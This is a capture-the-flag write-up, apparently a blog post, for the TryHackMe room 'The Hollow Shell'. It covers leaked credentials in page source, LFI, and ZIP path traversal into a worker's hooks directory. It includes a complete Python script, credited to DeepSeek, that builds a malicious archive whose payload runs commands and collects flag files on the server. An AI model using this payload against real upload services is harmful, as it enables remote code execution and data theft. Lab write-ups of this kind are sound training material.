+++
title = 'The Hollow Shell | TryHackMe Room Writeup'
date = '2026-08-06T00:00:00+05:00'
lastmod = '2026-08-06T00:00:00+05:00'
draft = false
description = 'A beginner-friendly walkthrough of The Hollow Shell, a TryHackMe web challenge that combines a login leak, archive upload abuse, LFI, and server-side hook execution.'
categories = ['Writeups']
tags = ['TryHackMe', 'Web Security', 'LFI', 'File Upload', 'Archive Abuse']
topics = ['tryhackme']
toc = true
image = 'images/room-banner.png'
+++

Welcome to my writeup for the TryHackMe room **The Hollow Shell**. This room took me much longer than I expected, mainly because I spent a lot of time testing the upload form before I understood how the application handled uploaded files in the background.

> **Spoiler warning:** This walkthrough reveals the room's solution path. The final flag is masked.

![The Hollow Shell room banner](images/room-banner.png)

## Finding the Web Application

The room provided a target URL, but the web application was running on port `5000` rather than the usual HTTP port `80`. A quick Nmap scan confirmed that port `5000` was open.

![Nmap scan showing the web service open on port 5000](images/nmap-port-scan.png)

I opened the site by adding the port to the target address:

```text
http://TARGET_IP:5000
```

The page displayed a staff login form.

![Byte Lotus staff sign-in page](images/staff-login.png)

Before trying to guess or brute-force the credentials, I checked the page source. The username and password had been left inside an HTML comment.

![Login page source revealing the staff credentials](images/login-source-credentials.png)

Using those credentials gave me access to the room's shell upload page.

## Investigating the Upload Form

The application accepted a ZIP file containing a `shell.json` manifest. The expected format was:

```json
{
  "name": "somename",
  "assets": [],
  "hooks": []
}
```

![Authenticated shell upload page showing the archive requirements](images/shell-upload-page.png)

I spent a lot of time testing the file extensions allowed by the uploader. I managed to make code inside an SVG execute when the file was rendered, but that did not lead to the flag. It was a dead end.

At that point, people in the TryHackMe Discord server were hinting at **local file inclusion (LFI)**. Following that hint, I changed direction and started looking for application source files.

## Finding the Application Source

Using LFI, I found two important Python files:

```text
app.py
theme_worker.py
```

These files explained how the upload feature worked. The application extracted the contents of an uploaded ZIP, while `theme_worker.py` processed Python files placed in the `hooks` directory.

The important weakness was that a ZIP entry could use `../` sequences to escape its intended extraction directory. If I added a file named `../../hooks/pwn.py` to the archive, the application would write it into the directory monitored by the worker.

That turned the upload into a path to server-side Python execution.

## Building the Malicious ZIP

I used the following script to build the archive. DeepSeek wrote the script for me after I worked out that the ZIP needed to place a Python file in the hooks directory.

```python
import zipfile, json

payload = r'''
import os, glob, stat

# Find the application base directory (where theme_worker.py lives)
base = os.path.dirname(
    next(iter(glob.glob('/**/theme_worker.py', recursive=True)), '/app')
)

# Create an output directory that's web-accessible
out_dir = os.path.join(base, 'shells', 'pwn')
os.makedirs(out_dir, exist_ok=True)

# Gather system info and flag contents
out_path = os.path.join(out_dir, 'out.txt')
with open(out_path, 'w') as f:
    f.write(f"id: {os.popen('id').read().strip()}\n")
    f.write(f"host: {os.popen('hostname').read().strip()}\n\n")

    for flag in glob.glob('/**/flag*', recursive=True):
        try:
            if os.path.isfile(flag):
                f.write(f"== {flag} ==\n")
                with open(flag, 'r', errors='ignore') as ff:
                    f.write(ff.read() + '\n')
        except Exception as e:
            f.write(f"[error] {e}\n")

# Make it readable
os.chmod(out_dir, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
os.chmod(out_path, stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH)
'''

with zipfile.ZipFile('hook.zip', 'w') as z:
    z.writestr('shell.json', json.dumps({"name": "x", "assets": []}))
    z.writestr('../../hooks/pwn.py', payload)

print("built hook.zip")
```

The archive contained two files:

```text
shell.json
../../hooks/pwn.py
```

The manifest was enough to satisfy the uploader, while the second filename used path traversal to place `pwn.py` in the hooks directory.

I ran the script to create `hook.zip` and uploaded the resulting archive.

![Application confirmation after accepting the crafted shell archive](images/upload-confirmation.png)

## Retrieving the Flag

After the upload, the background worker found and executed `pwn.py`. The payload searched the server for files beginning with `flag` and wrote anything it found to a web-accessible output file.

I opened the following path in the browser:

```text
/shells/pwn/out.txt
```

The flag was waiting there:

```text
THM{[REDACTED]}
```

## Final Thoughts

The complete path was:

```text
Credentials in page source
          ↓
Authenticated ZIP upload
          ↓
LFI reveals app.py and theme_worker.py
          ↓
ZIP path traversal writes ../../hooks/pwn.py
          ↓
Background worker executes the payload
          ↓
Flag is written to /shells/pwn/out.txt
```

This room really took a long time. The SVG route looked promising at first, and I probably stayed with it longer than I should have. Finding the application source through LFI was the turning point because it showed that the real vulnerability was not an allowed file extension—it was how the server extracted the archive and processed hooks afterward.

I also have to thank the TryHackMe Discord server. Their LFI hints helped me get unstuck and pointed me toward the part of the application I needed to investigate.

And we're done!
